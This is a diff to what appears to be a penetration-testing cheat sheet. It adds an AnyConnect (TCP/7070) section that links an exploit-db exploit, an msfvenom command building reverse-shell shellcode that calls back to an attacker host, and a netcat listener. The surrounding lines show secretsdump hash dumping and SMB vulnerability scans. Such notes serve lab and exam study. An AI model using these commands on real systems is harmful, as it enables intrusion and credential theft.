@@ -298,6 +298,12 @@ sudo nmap $VICTIM -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-
 sudo nmap $VICTIM -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
 ```
 
+### **TCP/667 - IRC**
+
+```
+irssi -c $VICTIM -p $PORT
+```
+
 ### **TCP/873 - RSYNC**
 
 ```
@@ -405,11 +411,25 @@ Dump hashes of other users if the user you have access to has the privilege's to
 python3 secretsdump.py  $DOMAIN/$USERNAME:$PASSWORD@$VICTIM
 ```
 
-### **TCP/667 - IRC**
+### TCP/7070 - AnyConnect
+
+**Exploit:** [https://www.exploit-db.com/raw/49613](https://www.exploit-db.com/raw/49613)
+
+For code above and just had to change the shellcode and ip variable.
+
+**Kali**
 
 ```
-irssi -c $VICTIM -p $PORT
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
 ```
+
+**Kali**
+
+```
+nc -lvnp 4444
+```
+
+###
 
 ####
 
